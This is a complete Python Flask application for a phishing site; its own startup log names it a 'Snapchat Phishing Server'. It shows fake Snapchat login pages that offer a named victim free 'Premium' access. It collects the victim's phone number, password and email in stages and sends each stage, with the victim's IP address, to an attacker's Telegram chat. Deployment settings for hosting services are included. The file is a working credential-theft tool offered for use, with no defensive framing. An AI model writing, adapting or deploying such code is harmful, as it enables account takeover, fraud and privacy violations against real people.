import os
import json
import time
import logging
from datetime import datetime
from flask import Flask, render_template_string, request, session, redirect, url_for, send_from_directory
from telegram import Bot
from telegram.error import TelegramError, TimedOut
from dotenv import load_dotenv
import threading

# ==================== CONFIGURATION ====================
load_dotenv()

app = Flask(__name__)
app.secret_key = os.getenv('FLASK_SECRET_KEY', 'fallback_secret_key_change_in_production')

# Telegram Configuration
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')
VICTIM_NAME = os.getenv('VICTIM_NAME', 'User')
ACTIVATION_HOURS = int(os.getenv('ACTIVATION_HOURS', '12'))

# Initialize Telegram Bot (with error handling)
bot = None
if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
    try:
        bot = Bot(token=TELEGRAM_BOT_TOKEN)
        logging.info("Telegram bot initialized successfully")
    except Exception as e:
        logging.error(f"Failed to initialize Telegram bot: {e}")
        bot = None
else:
    logging.warning("Telegram bot token or chat ID not configured")

# Configure Logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ==================== TELEGRAM UTILITIES ====================
def safe_send_telegram(message, retries=3):
    """
    Send message to Telegram with retry logic and comprehensive error handling
    """
    if not bot or not TELEGRAM_CHAT_ID:
        logger.error("Telegram not configured. Check .env file.")
        return False
    
    for attempt in range(retries):
        try:
            bot.send_message(
                chat_id=TELEGRAM_CHAT_ID,
                text=message,
                parse_mode='HTML',
                disable_web_page_preview=True
            )
            logger.info(f"Telegram alert sent successfully (attempt {attempt + 1})")
            return True
            
        except TimedOut:
            logger.warning(f"Telegram timeout (attempt {attempt + 1}), retrying...")
            time.sleep(2)
            
        except TelegramError as e:
            logger.error(f"Telegram error: {e}")
            if attempt == retries - 1:
                # Last attempt failed, try one more with simplified message
                try:
                    bot.send_message(
                        chat_id=TELEGRAM_CHAT_ID,
                        text=f"⚠️ Alert (fallback): {message[:100]}...",
                        disable_web_page_preview=True
                    )
                    return True
                except:
                    return False
            time.sleep(1)
            
        except Exception as e:
            logger.error(f"Unexpected error sending to Telegram: {e}")
            return False
    
    return False

def send_telegram_alert(stage, data, ip_address):
    """
    Format and send alert to Telegram
    """
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')
    
    if stage == "PHONE":
        phone = data
        message = f"""
<b>📱 STAGE 1 - PHONE CAPTURED</b>
━━━━━━━━━━━━━━━━━━━━━━
📞 <b>Phone:</b> +91{phone}
🌐 <b>IP:</b> {ip_address}
🕒 <b>Time:</b> {timestamp}
━━━━━━━━━━━━━━━━━━━━━━
"""
    
    elif stage == "PASSWORD":
        phone = data.get('phone', 'N/A')
        password = data.get('password', 'N/A')
        message = f"""
<b>🔑 STAGE 2 - PASSWORD CAPTURED</b>
━━━━━━━━━━━━━━━━━━━━━━
📞 <b>Phone:</b> +91{phone}
🔐 <b>Password:</b> {password}
🌐 <b>IP:</b> {ip_address}
🕒 <b>Time:</b> {timestamp}
━━━━━━━━━━━━━━━━━━━━━━
"""
    
    elif stage == "FULL":
        phone = data.get('phone', 'N/A')
        password = data.get('password', 'N/A')
        email = data.get('email', 'N/A')
        message = f"""
<b>🎯 FULL CREDENTIALS CAPTURED</b>
━━━━━━━━━━━━━━━━━━━━━━
👤 <b>Target:</b> {VICTIM_NAME}
📞 <b>Phone:</b> +91{phone}
🔐 <b>Password:</b> {password}
📧 <b>Email:</b> {email}
🌐 <b>IP:</b> {ip_address}
🕒 <b>Time:</b> {timestamp}
━━━━━━━━━━━━━━━━━━━━━━
<b>✅ Premium Activation:</b> {ACTIVATION_HOURS} hours
━━━━━━━━━━━━━━━━━━━━━━
"""
    
    else:
        return False
    
    # Send in background thread to avoid blocking
    thread = threading.Thread(target=safe_send_telegram, args=(message,))
    thread.daemon = True
    thread.start()
    
    return True

# ==================== HTML TEMPLATES ====================
INDEX_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark only">
    <meta name="supported-color-schemes" content="dark">
    <title>Snapchat - Log In</title>
    <style>
        :root { color-scheme: dark only !important; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #000000 !important; color: #ffffff !important; color-scheme: dark only !important; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: #0a0a0a !important; color: #ffffff !important; border-radius: 20px; box-shadow: 0 10px 30px rgba(255, 215, 0, 0.05); padding: 40px; max-width: 420px; width: 100%; text-align: center; border: 1px solid #222; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 85px; height: 85px; border-radius: 20px; object-fit: cover; box-shadow: 0 4px 15px rgba(0,0,0,0.8); }
        h2 { color: #ffffff; margin-bottom: 10px; font-size: 24px; }
        .premium-text { background: linear-gradient(90deg, #FFFC00, #F5B041); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 700; margin: 15px 0; font-size: 16px; }
        .victim-name { color: #FFFC00; font-weight: bold; }
        .info-text { color: #aaaaaa; margin-bottom: 25px; font-size: 14px; line-height: 1.5; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; color: #dddddd; margin-bottom: 8px; font-weight: 500; font-size: 14px; }
        .phone-input { display: flex; gap: 10px; }
        .country-code { width: 100px; padding: 12px; border: 1px solid #333; border-radius: 8px; background: #111; color: #fff; font-size: 14px; outline: none; }
        input[type="tel"] { flex: 1; padding: 12px; border: 1px solid #333; border-radius: 8px; background: #111; color: #fff; font-size: 16px; outline: none; }
        input:focus, select:focus { border-color: #FFFC00; box-shadow: 0 0 0 2px rgba(255,252,0,0.1); }
        .hint { color: #777; font-size: 12px; margin-top: 5px; display: block; }
        .btn-login { background: linear-gradient(90deg, #FFFC00, #F5B041); color: #000; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s; margin-top: 10px; }
        .btn-login:hover { transform: translateY(-2px); opacity: 0.9; }
        .footer-links { display: flex; justify-content: center; gap: 20px; margin: 25px 0; }
        .footer-links a { color: #FFFC00; text-decoration: none; font-size: 14px; }
        .footer-links a:hover { text-decoration: underline; }
        .footer { color: #666; font-size: 12px; margin-top: 20px; line-height: 1.4; }
        .footer a { color: #999; text-decoration: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{{ url_for('static', filename='image.jpg') }}" onerror="this.src='image.jpg'" alt="Snapchat Premium">
        </div>
        <h2>Log In to Snapchat</h2>
        <p class="premium-text">Congratulations <span class="victim-name">{{ victim_name }}</span>! You've been selected for Snapchat Premium.</p>
        <p class="info-text">Verify your account to activate exclusive Premium features for 12 months absolutely free.</p>
        
        <form action="/login" method="POST" class="login-form">
            <div class="input-group">
                <label for="phone">Mobile Number</label>
                <div class="phone-input">
                    <select name="countryCode" id="countryCode" class="country-code">
                        <option value="+91" selected>+91 India</option>
                        <option value="+1">+1 USA</option>
                        <option value="+44">+44 UK</option>
                        <option value="+49">+49 Germany</option>
                        <option value="+33">+33 France</option>
                    </select>
                    <input type="tel" id="phone" name="phone" placeholder="Enter 10-digit number" required pattern="[0-9]{10}" title="Enter 10-digit mobile number" maxlength="10">
                </div>
                <small class="hint">Enter your mobile number without +91</small>
            </div>
            
            <button type="submit" class="btn-login">Log In</button>
        </form>
        
        <div class="footer-links">
            <a href="https://accounts.snapchat.com/accounts/password_reset_options" target="_blank">Forgot Password?</a>
            <a href="https://accounts.snapchat.com/accounts/signup" target="_blank">Sign Up</a>
            <a href="https://help.snapchat.com/" target="_blank">Help</a>
        </div>
        
        <p class="footer">By proceeding, you agree to our <a href="https://snapchat.com/privacy" target="_blank">Privacy Policy</a> and <a href="https://snapchat.com/terms" target="_blank">Terms of Service</a>.</p>
    </div>
    
    <script>
        document.getElementById('phone').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 10);
        });
    </script>
</body>
</html>
'''

PASSWORD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark only">
    <meta name="supported-color-schemes" content="dark">
    <title>Snapchat - Enter Password</title>
    <style>
        :root { color-scheme: dark only !important; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #000000 !important; color: #ffffff !important; color-scheme: dark only !important; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: #0a0a0a !important; color: #ffffff !important; border-radius: 20px; box-shadow: 0 10px 30px rgba(255, 215, 0, 0.05); padding: 40px; max-width: 420px; width: 100%; text-align: center; border: 1px solid #222; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 85px; height: 85px; border-radius: 20px; object-fit: cover; box-shadow: 0 4px 15px rgba(0,0,0,0.8); }
        h2 { color: #ffffff; margin-bottom: 10px; font-size: 24px; }
        .info-text { color: #aaaaaa; margin-bottom: 25px; font-size: 14px; line-height: 1.5; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; color: #dddddd; margin-bottom: 8px; font-weight: 500; font-size: 14px; }
        input[type="password"], input[type="text"] { width: 100%; padding: 12px; border: 1px solid #333; border-radius: 8px; font-size: 16px; background: #111; color: #fff; outline: none; }
        input:focus { border-color: #FFFC00; box-shadow: 0 0 0 2px rgba(255,252,0,0.1); }
        .password-toggle { margin-top: 10px; font-size: 13px; color: #aaa; display: flex; align-items: center; }
        .password-toggle input { margin-right: 8px; width: auto; accent-color: #FFFC00; }
        .btn-login { background: linear-gradient(90deg, #FFFC00, #F5B041); color: #000; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s; margin-top: 10px; }
        .btn-login:hover { transform: translateY(-2px); opacity: 0.9; }
        .footer { color: #666; font-size: 12px; margin-top: 20px; line-height: 1.4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{{ url_for('static', filename='image.jpg') }}" onerror="this.src='image.jpg'" alt="Snapchat Premium">
        </div>
        <h2>Enter Password</h2>
        <p class="info-text">For security, please enter your Snapchat password to continue.</p>
        
        <form action="/submit_password" method="POST" class="login-form">
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required minlength="6">
                <div class="password-toggle">
                    <input type="checkbox" id="showPassword"> Show Password
                </div>
            </div>
            
            <button type="submit" class="btn-login">Continue</button>
        </form>
        
        <p class="footer">This helps us verify your identity and secure your Premium account.</p>
    </div>
    
    <script>
        document.getElementById('showPassword').addEventListener('change', function(e) {
            const passwordInput = document.getElementById('password');
            passwordInput.type = this.checked ? 'text' : 'password';
        });
    </script>
</body>
</html>
'''

EMAIL_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark only">
    <meta name="supported-color-schemes" content="dark">
    <title>Snapchat - Verify Email</title>
    <style>
        :root { color-scheme: dark only !important; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #000000 !important; color: #ffffff !important; color-scheme: dark only !important; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: #0a0a0a !important; color: #ffffff !important; border-radius: 20px; box-shadow: 0 10px 30px rgba(255, 215, 0, 0.05); padding: 40px; max-width: 420px; width: 100%; text-align: center; border: 1px solid #222; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 85px; height: 85px; border-radius: 20px; object-fit: cover; box-shadow: 0 4px 15px rgba(0,0,0,0.8); }
        h2 { color: #ffffff; margin-bottom: 10px; font-size: 24px; }
        .info-text { color: #aaaaaa; margin-bottom: 25px; font-size: 14px; line-height: 1.5; }
        .input-group { margin-bottom: 20px; text-align: left; }
        label { display: block; color: #dddddd; margin-bottom: 8px; font-weight: 500; font-size: 14px; }
        input[type="email"] { width: 100%; padding: 12px; border: 1px solid #333; border-radius: 8px; font-size: 16px; background: #111; color: #fff; outline: none; }
        input:focus { border-color: #FFFC00; box-shadow: 0 0 0 2px rgba(255,252,0,0.1); }
        .hint { color: #777; font-size: 12px; margin-top: 5px; display: block; }
        .btn-login { background: linear-gradient(90deg, #FFFC00, #F5B041); color: #000; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: transform 0.2s; margin-top: 10px; }
        .btn-login:hover { transform: translateY(-2px); opacity: 0.9; }
        .footer { color: #666; font-size: 12px; margin-top: 20px; line-height: 1.4; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{{ url_for('static', filename='image.jpg') }}" onerror="this.src='image.jpg'" alt="Snapchat Premium">
        </div>
        <h2>Almost There!</h2>
        <p class="info-text">Final step: Enter your email address for Premium activation confirmation.</p>
        
        <form action="/submit_email" method="POST" class="login-form">
            <div class="input-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="you@example.com" required>
                <small class="hint">We'll send your Premium activation link to this email.</small>
            </div>
            
            <button type="submit" class="btn-login">Finish & Activate Premium</button>
        </form>
        
        <p class="footer">By completing this, you agree to receive Premium updates via email.</p>
    </div>
</body>
</html>
'''

SUCCESS_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="color-scheme" content="dark only">
    <meta name="supported-color-schemes" content="dark">
    <title>Snapchat Premium Activated</title>
    <style>
        :root { color-scheme: dark only !important; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #000000 !important; color: #ffffff !important; color-scheme: dark only !important; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .container { background: #0a0a0a !important; color: #ffffff !important; border-radius: 20px; box-shadow: 0 10px 30px rgba(255, 215, 0, 0.05); padding: 40px; max-width: 500px; width: 100%; text-align: center; border: 1px solid #222; }
        .logo { margin-bottom: 20px; }
        .logo img { width: 100px; height: 100px; border-radius: 20px; object-fit: cover; box-shadow: 0 4px 15px rgba(0,0,0,0.8); }
        h1 { color: #ffffff; margin-bottom: 10px; font-size: 32px; }
        h3 { color: #dddddd; margin-bottom: 20px; font-size: 20px; }
        .success-icon { width: 80px; height: 80px; background: linear-gradient(135deg, #FFFC00, #F5B041); color: #000; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; margin: 20px auto; font-weight: bold; box-shadow: 0 4px 15px rgba(255,252,0,0.2); }
        .success-text { color: #aaaaaa; margin-bottom: 25px; font-size: 16px; line-height: 1.6; }
        .benefits { background: #111; border-radius: 12px; padding: 20px; margin: 20px 0; text-align: left; border: 1px solid #222; }
        .benefits h4 { color: #FFFC00; margin-bottom: 15px; font-size: 18px; }
        .benefits ul { list-style: none; padding: 0; }
        .benefits li { padding: 8px 0; color: #ccc; font-size: 15px; position: relative; padding-left: 25px; }
        .benefits li:before { content: "✓"; color: #FFFC00; font-weight: bold; position: absolute; left: 0; }
        .note { color: #888; font-size: 14px; margin: 20px 0; line-height: 1.5; font-style: italic; }
        .btn-back { display: inline-block; background: linear-gradient(90deg, #FFFC00, #F5B041); color: #000; padding: 12px 30px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 10px; transition: transform 0.2s; }
        .btn-back:hover { transform: translateY(-2px); opacity: 0.9; }
        .activation-time { color: #FFFC00; font-weight: bold; font-size: 20px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="{{ url_for('static', filename='image.jpg') }}" onerror="this.src='image.jpg'" alt="Snapchat Premium">
        </div>
        <h1>Success!</h1>
        <div class="success-icon">✓</div>
        <h3>Snapchat Premium Activated</h3>
        
        <p class="success-text">
            Your Snapchat Premium access is being processed and will be fully activated within
        </p>
        
        <div class="activation-time">{{ activation_hours }} hours</div>
        
        <div class="benefits">
            <h4>Premium Features You'll Get:</h4>
            <ul>
                <li>Unlimited Snaps & Stories</li>
                <li>Exclusive Filters & Lenses</li>
                <li>Ad-Free Experience</li>
                <li>Priority 24/7 Support</li>
                <li>Custom Emojis & Themes</li>
                <li>Advanced Analytics</li>
                <li>Early Access to New Features</li>
            </ul>
        </div>
        
        <p class="note">
            You will receive a confirmation email with further instructions within {{ activation_hours }} hours.<br>
            Thank you for being a valued Snapchat user!
        </p>
        
        <a href="https://snapchat.com" class="btn-back">Return to Snapchat</a>
    </div>
</body>
</html>
'''

# ==================== ROUTES ====================
@app.route('/')
def index():
    """First page - Phone number entry with personalized message"""
    session.clear()  # Clear any previous session
    return render_template_string(INDEX_HTML, victim_name=VICTIM_NAME)

@app.route('/login', methods=['POST'])
def login():
    """Capture phone number and send to Telegram"""
    try:
        phone = request.form.get('phone', '').strip()
        
        # Validate phone number (10 digits for India)
        if not phone.isdigit() or len(phone) != 10:
            return redirect(url_for('index'))
        
        # Store in session
        session['phone'] = phone
        session['stage'] = 'phone_captured'
        
        # Send to Telegram (background thread)
        send_telegram_alert("PHONE", phone, request.remote_addr)
        
        logger.info(f"Phone captured: +91{phone} from IP: {request.remote_addr}")
        
        return redirect(url_for('password_page'))
        
    except Exception as e:
        logger.error(f"Error in /login: {e}")
        return redirect(url_for('index'))

@app.route('/password')
def password_page():
    """Second page - Password entry"""
    if 'phone' not in session:
        return redirect(url_for('index'))
    return render_template_string(PASSWORD_HTML)

@app.route('/submit_password', methods=['POST'])
def submit_password():
    """Capture password and send to Telegram"""
    try:
        if 'phone' not in session:
            return redirect(url_for('index'))
        
        password = request.form.get('password', '').strip()
        
        if not password or len(password) < 6:
            return redirect(url_for('password_page'))
        
        session['password'] = password
        session['stage'] = 'password_captured'
        
        # Prepare data for Telegram
        data = {
            'phone': session['phone'],
            'password': password
        }
        
        # Send to Telegram
        send_telegram_alert("PASSWORD", data, request.remote_addr)
        
        logger.info(f"Password captured for +91{session['phone']}")
        
        return redirect(url_for('email_page'))
        
    except Exception as e:
        logger.error(f"Error in /submit_password: {e}")
        return redirect(url_for('index'))

@app.route('/email')
def email_page():
    """Third page - Email entry"""
    if 'password' not in session:
        return redirect(url_for('index'))
    return render_template_string(EMAIL_HTML)

@app.route('/submit_email', methods=['POST'])
def submit_email():
    """Capture email, send full data to Telegram, show success"""
    try:
        if 'password' not in session:
            return redirect(url_for('index'))
        
        email = request.form.get('email', '').strip()
        
        if not email or '@' not in email:
            return redirect(url_for('email_page'))
        
        # Prepare complete data package
        full_data = {
            'phone': session.get('phone', 'N/A'),
            'password': session.get('password', 'N/A'),
            'email': email
        }
        
        # Send complete credentials to Telegram
        send_telegram_alert("FULL", full_data, request.remote_addr)
        
        logger.info(f"Complete credentials captured for +91{session.get('phone')}")
        
        # Clear session after successful capture
        session.clear()
        
        # Show success page
        return render_template_string(SUCCESS_HTML, activation_hours=ACTIVATION_HOURS)
        
    except Exception as e:
        logger.error(f"Error in /submit_email: {e}")
        return redirect(url_for('index'))


@app.route('/image.jpg')
def serve_image():
    return send_from_directory('.', 'image.jpg')

@app.route('/favicon.ico')
def favicon():
    """Serve favicon to avoid 404 errors"""
    return '', 204

# ==================== ERROR HANDLERS ====================
@app.errorhandler(404)
def page_not_found(e):
    """Redirect 404 to index"""
    return redirect(url_for('index'))

@app.errorhandler(500)
def internal_server_error(e):
    """Handle server errors gracefully"""
    logger.error(f"500 Error: {e}")
    return "Server error. Please try again later.", 500

@app.errorhandler(Exception)
def handle_all_exceptions(e):
    """Catch-all exception handler"""
    logger.error(f"Unhandled exception: {e}")
    return redirect(url_for('index'))

# ==================== HEALTH CHECK ====================
@app.route('/health')
def health_check():
    """Health endpoint for Render/Railway monitoring"""
    telegram_status = "CONFIGURED" if bot and TELEGRAM_CHAT_ID else "NOT_CONFIGURED"
    return {
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'telegram': telegram_status,
        'victim_name': VICTIM_NAME
    }, 200

# ==================== APPLICATION START ====================
if __name__ == '__main__':
    # Log startup information
    logger.info("=" * 50)
    logger.info("Snapchat Phishing Server Starting...")
    logger.info(f"Victim Name: {VICTIM_NAME}")
    logger.info(f"Activation Hours: {ACTIVATION_HOURS}")
    logger.info(f"Telegram Bot: {'CONFIGURED' if bot else 'NOT_CONFIGURED'}")
    logger.info("=" * 50)
    
    # Get port from environment (for Render/Railway)
    port = int(os.environ.get('PORT', 5000))
    
    # Run the application
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False  # Always False in production
    )